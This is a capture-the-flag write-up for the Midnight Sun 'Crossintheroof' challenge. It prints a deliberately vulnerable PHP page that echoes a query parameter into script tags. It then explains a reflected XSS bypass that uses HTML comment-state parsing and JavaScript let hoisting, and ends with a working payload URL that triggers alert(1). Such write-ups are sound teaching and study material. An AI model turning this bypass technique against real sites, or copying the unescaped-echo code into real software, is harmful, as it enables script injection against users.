# Crossintheroof

## Description

```
Alert the cyber police, someone wrote insecure code!
settings Service: http://crossintheroof-01.play.midnightsunctf.se/
```

Front page:
```
Cross in the roof
Make alert(1) pop here(http://crossintheroof-01.play.midnightsunctf.se/#) in Chrome and submit the working URL in the form below.
```

Code:
```
<?php

header('X-XSS-Protection: 0');
header('X-Frame-Options: deny');
header('X-Content-Type-Options: nosniff');
header('Content-Type: text/html; charset=UTF-8');

if(!isset($_GET['xss'])){
    if(isset($_GET['error'])){
        die('stop haking me!!!');
    }

    if(isset($_GET['source'])){
        highlight_file('index.php');
        die();
    }

    die('unluky');
}

 $xss = $_GET['xss']?$_GET['xss']:"";
 $xss = preg_replace("|[}/{]|", "", $xss);

?>
<script>
setTimeout(function(){
    try{
        return location = '/?i_said_no_xss_4_u_:)';
        nodice=<?php echo $xss; ?>;
    }catch(err){
        return location = '/?error='+<?php echo $xss; ?>;
    }
    },500);
</script>
<script>
/* 
    payload: <?php echo $xss ?>
*/
</script>
<body onload='location="/?no_xss_4_u_:)"'>hi. bye.</body>
```

## Solution

Task: attack the user with reflected XSS through this page

### Example of response

request:
```
GET /?xss=INJECTION HTTP/1.1
Host: crossintheroof-01.play.midnightsunctf.se:3000
```

response:
```
HTTP/1.1 200 OK
Server: nginx/1.17.9
Date: Sun, 05 Apr 2020 11:21:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/5.6.40
X-XSS-Protection: 0
X-Frame-Options: deny
X-Content-Type-Options: nosniff
Content-Length: 291

<script>
setTimeout(function(){
    try{
        return location = '/?i_said_no_xss_4_u_:)';
        nodice=INJECTION;
    }catch(err){
        return location = '/?error='+INJECTION;
    }
    },500);
</script>
<script>
/*
    payload: INJECTION
*/
</script>
<body onload='location="/?no_xss_4_u_:)"'>hi. bye.</body>
```

### Thoughts

#### Script data double escaped state

Firstly, we have to bypass execution of the `onload` attribute, cause it executes at the beginning.

Here we can use a feature of HTML tokenization that is called: `Script data double escaped state`.

The gist is if you are in a `<script>` tag and come across `<!--` followed at some point by `<script>` again, then the next `</script>` is ignored, unless you leave comment mode `-->`.

So, if we inject the following code: `1;<!--<script`, we will spoil the second javascript code and it'll consume body tag.

Why is it important don't close the `script` tag with `>`? Because if we leave `>` here, then the first block will be spoiled too.

Look for example:

```html

<script>
setTimeout(function(){
    try{
        return location = '/?i_said_no_xss_4_u_:)';
        nodice=1;<!--<script;                           <-- it doesn't work
    }catch(err){
        return location = '/?error='+1;<!--<script;     <-- it doesn't work
    }
    },500);
</script>
<script>
/*
    payload: 1;<!--<script                               <-- it works
*/
</script>                                                <-- next script is ignored
<body onload='location="/?no_xss_4_u_:)"'>hi. bye.</body><-- It has been consumed by the <script> tag.
```

For a better understanding:

- Discussion https://github.com/w3c/html/issues/1617 
- Specs - https://www.w3.org/TR/html52/syntax.html#tokenizer-script-data-double-escaped-state
- Explanation - http://archive.li/VrotB#selection-683.126-683.151
- Other example of task - https://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/



#### JavaScript Hoisting

After that we can bypass redirection from JS with knowledge of the "Hoisting" mechanism.

The concept: `Hoisting is a JavaScript mechanism where variables and function declarations are moved to the top of their scope before code execution.`

But for `let` and `const` declaration `Hoisting` working is a bit tricky. Read: [Hoisting in Modern JavaScript — let, const, and var
](https://blog.bitsrc.io/hoisting-in-modern-javascript-let-const-and-var-b290405adfda)

**For `var` declaration:**

```
When JavaScript engine finds a var variable declaration during the compile phase, it will add that variable to the lexical environment and initialize it with "undefined".
```

**For `let` and `const`:**

Let’s first take a look at some examples:
```
console.log(a);
let a = 3;
```

Output:
```
ReferenceError: a is not defined
```

So are `let` and `const` variables not hoisted?

The answer is a bit more complicated than that. `All declarations (function, var, let, const and class) are hoisted in JavaScript, while the var declarations are initialized with undefined, but let and const declarations remain uninitialized`.

That means, if we declare the `location` variable after the string `return location=...`, it will no longer be a global variable for the context of our lambda function. The `location` variable has been declared but remains uninitialized. 

*This means you can’t access the variable before the engine evaluates its value at the place it was declared in the source code. This is what we call “Temporal Dead Zone”, A time span between variable creation and its initialization where they can’t be accessed.*


For a better understanding:

- https://blog.bitsrc.io/hoisting-in-modern-javascript-let-const-and-var-b290405adfda
- https://scotch.io/tutorials/understanding-hoisting-in-javascript


### The End

Solution:

```
http://crossintheroof-01.play.midnightsunctf.se:3000/?xss=alert(1);let%20location=1%3C!--%3Cscript
```
